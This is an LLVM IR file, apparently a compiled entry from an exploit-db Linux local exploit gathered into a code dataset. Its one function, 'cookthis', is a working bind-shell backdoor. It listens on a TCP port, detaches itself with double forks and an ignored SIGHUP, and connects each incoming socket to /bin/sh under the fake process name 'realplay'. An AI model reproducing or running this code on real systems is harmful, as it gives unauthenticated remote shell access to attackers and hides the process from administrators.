; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23126.c_cookthis.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_23126.c_cookthis.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@EXIT_FAILURE = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@SIGHUP = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"realplay\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @cookthis() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = load i32, i32* @AF_INET, align 4
  %10 = load i32, i32* @SOCK_STREAM, align 4
  %11 = load i32, i32* @IPPROTO_TCP, align 4
  %12 = call i32 @socket(i32 %9, i32 %10, i32 %11)
  store i32 %12, i32* %1, align 4
  %13 = icmp eq i32 %12, -1
  br i1 %13, label %14, label %17

14:                                               ; preds = %0
  %15 = load i32, i32* @EXIT_FAILURE, align 4
  %16 = call i32 @exit(i32 %15) #3
  unreachable

17:                                               ; preds = %0
  %18 = bitcast %struct.sockaddr_in* %7 to i8*
  %19 = call i32 @bzero(i8* %18, i32 12)
  %20 = load i32, i32* @AF_INET, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %20, i32* %21, align 4
  %22 = load i32, i32* @INADDR_ANY, align 4
  %23 = call i32 @htonl(i32 %22)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  store i32 %23, i32* %25, align 4
  %26 = load i32, i32* @PORT, align 4
  %27 = call i32 @htons(i32 %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i32 %27, i32* %28, align 4
  %29 = load i32, i32* %1, align 4
  %30 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %31 = call i32 @bind(i32 %29, %struct.sockaddr* %30, i32 12)
  store i32 %31, i32* %3, align 4
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %36

33:                                               ; preds = %17
  %34 = load i32, i32* @EXIT_FAILURE, align 4
  %35 = call i32 @exit(i32 %34) #3
  unreachable

36:                                               ; preds = %17
  %37 = call i32 (...) @fork()
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %42

39:                                               ; preds = %36
  %40 = load i32, i32* @EXIT_SUCCESS, align 4
  %41 = call i32 @exit(i32 %40) #3
  unreachable

42:                                               ; preds = %36
  %43 = call i32 (...) @setpgrp()
  %44 = load i32, i32* @SIGHUP, align 4
  %45 = load i32, i32* @SIG_IGN, align 4
  %46 = call i32 @signal(i32 %44, i32 %45)
  %47 = call i32 (...) @fork()
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %52

49:                                               ; preds = %42
  %50 = load i32, i32* @EXIT_SUCCESS, align 4
  %51 = call i32 @exit(i32 %50) #3
  unreachable

52:                                               ; preds = %42
  %53 = load i32, i32* %1, align 4
  %54 = call i32 @listen(i32 %53, i32 5)
  store i32 %54, i32* %3, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %59

56:                                               ; preds = %52
  %57 = load i32, i32* @EXIT_SUCCESS, align 4
  %58 = call i32 @exit(i32 %57) #3
  unreachable

59:                                               ; preds = %52
  br label %60

60:                                               ; preds = %59, %85
  store i32 12, i32* %4, align 4
  %61 = load i32, i32* %1, align 4
  %62 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %63 = call i32 @accept(i32 %61, %struct.sockaddr* %62, i32* %4)
  store i32 %63, i32* %2, align 4
  %64 = icmp slt i32 %63, 0
  br i1 %64, label %65, label %68

65:                                               ; preds = %60
  %66 = load i32, i32* @EXIT_SUCCESS, align 4
  %67 = call i32 @exit(i32 %66) #3
  unreachable

68:                                               ; preds = %60
  %69 = call i32 (...) @getpid()
  store i32 %69, i32* %6, align 4
  %70 = call i32 (...) @fork()
  store i32 %70, i32* %5, align 4
  %71 = load i32, i32* %5, align 4
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %73, label %85

73:                                               ; preds = %68
  %74 = load i32, i32* %2, align 4
  %75 = call i32 @dup2(i32 %74, i32 0)
  %76 = load i32, i32* %2, align 4
  %77 = call i32 @dup2(i32 %76, i32 1)
  %78 = load i32, i32* %2, align 4
  %79 = call i32 @dup2(i32 %78, i32 2)
  %80 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i8* null)
  %81 = load i32, i32* %2, align 4
  %82 = call i32 @close(i32 %81)
  %83 = load i32, i32* @EXIT_SUCCESS, align 4
  %84 = call i32 @exit(i32 %83) #3
  unreachable

85:                                               ; preds = %68
  %86 = load i32, i32* %2, align 4
  %87 = call i32 @close(i32 %86)
  br label %60
}

declare dso_local i32 @socket(i32, i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @setpgrp(...) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
